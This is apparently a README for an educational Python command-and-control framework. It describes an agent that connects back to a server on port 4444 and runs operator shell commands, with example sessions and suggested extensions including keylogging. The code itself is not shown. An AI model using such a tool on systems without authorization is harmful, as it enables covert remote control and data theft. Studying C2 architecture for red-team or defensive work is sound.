# Educational C2 (Command and Control) Framework

⚠️ **DISCLAIMER**: This code is for **educational purposes only**. It demonstrates the architecture and concepts of Command and Control systems used in cybersecurity research and red team operations. Do not use this for any malicious purposes.

## Overview

This is a simple C2 framework consisting of:
- **C2 Server** ([`c2_server.py`](c2_server.py:1)) - The command and control server that manages agents
- **C2 Agent** ([`c2_agent.py`](c2_agent.py:1)) - The client/agent that connects to the server and executes commands

## Architecture

```
┌─────────────────┐                    ┌─────────────────┐
│   C2 Server     │◄───────────────────┤   C2 Agent 1    │
│  (Operator)     │                    │   (Target)      │
│                 │                    └─────────────────┘
│  - Manages      │                    
│    agents       │                    ┌─────────────────┐
│  - Sends        │◄───────────────────┤   C2 Agent 2    │
│    commands     │                    │   (Target)      │
│  - Receives     │                    └─────────────────┘
│    results      │
└─────────────────┘                    ┌─────────────────┐
                                       │   C2 Agent N    │
                                       │   (Target)      │
                                       └─────────────────┘
```

## Features

### Server Features
- Multi-agent management
- Interactive command interface
- Agent listing and status tracking
- Command execution on remote agents
- System information collection
- Connection persistence

### Agent Features
- Automatic connection with retry logic
- System information beacon
- Command execution
- Error handling and reporting
- Graceful disconnection

## Installation

No external dependencies required! Uses only Python standard library.

```bash
# Make scripts executable (optional)
chmod +x c2_server.py c2_agent.py
```

## Usage

### 1. Start the C2 Server

```bash
python3 c2_server.py
```

The server will start listening on `0.0.0.0:4444` by default.

### 2. Start Agent(s)

On the same machine (for testing):
```bash
python3 c2_agent.py 127.0.0.1 4444
```

On a remote machine:
```bash
python3 c2_agent.py <SERVER_IP> 4444
```

### 3. Interact with Agents

Once agents connect, use the server's command interface:

#### List Connected Agents
```
C2> list
```

#### Execute Command on Specific Agent
```
C2> exec 1 whoami
C2> exec 1 pwd
C2> exec 1 ls -la
```

#### Interactive Session with Agent
```
C2> use 1
Agent-1> whoami
Agent-1> uname -a
Agent-1> back
```

#### Shutdown Server
```
C2> exit
```

## Command Reference

### Server Commands

| Command | Description | Example |
|---------|-------------|---------|
| `list` | List all connected agents | `list` |
| `exec <id> <cmd>` | Execute command on agent | `exec 1 whoami` |
| `use <id>` | Start interactive session | `use 1` |
| `exit` | Shutdown C2 server | `exit` |

### Agent Commands

Agents execute any system command sent by the server:
- Shell commands: `ls`, `pwd`, `whoami`, etc.
- System information: `uname -a`, `hostname`, etc.
- File operations: `cat file.txt`, `ls -la`, etc.

## Example Session

```
# Terminal 1 - Start Server
$ python3 c2_server.py
[+] C2 Server started on 0.0.0.0:4444
[+] Waiting for agents to connect...

# Terminal 2 - Start Agent
$ python3 c2_agent.py 127.0.0.1
[+] Connected to C2 server at 127.0.0.1:4444
[+] Agent running. Waiting for commands...

# Back to Terminal 1 - Server shows connection
[+] New agent connected: ID=1 from 127.0.0.1:54321
[+] Agent 1 beacon: my-hostname

# Interact with agent
C2> list
================================================================================
ID    Address              Hostname             Connected At             
================================================================================
1     127.0.0.1:54321      my-hostname          2026-02-05T02:45:00.123456
================================================================================

C2> exec 1 whoami
[+] Response from Agent 1:
username

C2> use 1
[+] Interactive session with Agent 1
Agent-1> pwd
[+] Response from Agent 1:
/home/username

Agent-1> back
C2> exit
[!] Shutting down C2 server...
```

## Security Considerations

This is an **unencrypted, unauthenticated** C2 framework for educational purposes. Real-world C2 frameworks include:

- **Encryption**: TLS/SSL for communication
- **Authentication**: Verify server and agent identities
- **Obfuscation**: Hide traffic patterns
- **Persistence**: Survive reboots
- **Evasion**: Avoid detection by security tools
- **Payload delivery**: Multiple delivery mechanisms
- **Data exfiltration**: Secure data extraction

## Learning Resources

To learn more about C2 frameworks and red team operations:

1. **Frameworks to Study**:
   - Metasploit Framework
   - Cobalt Strike
   - Empire/Starkiller
   - Covenant
   - Sliver

2. **Concepts to Explore**:
   - Network protocols (HTTP, HTTPS, DNS)
   - Encryption and encoding
   - Process injection
   - Privilege escalation
   - Lateral movement
   - Defense evasion

3. **Practice Environments**:
   - HackTheBox
   - TryHackMe
   - PentesterLab
   - SANS Cyber Ranges

## Legal Notice

⚠️ **IMPORTANT**: 
- Only use this code in authorized environments
- Never deploy on systems you don't own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- This is for learning cybersecurity concepts only

## License

This educational code is provided as-is for learning purposes.

## Contributing

This is an educational example. Feel free to extend it with:
- Encryption (TLS/SSL)
- Authentication mechanisms
- File upload/download capabilities
- Screenshot capture
- Keylogging (ethical testing only!)
- Process management
- Network scanning

---

**Remember**: With great power comes great responsibility. Use your knowledge ethically! 🛡️
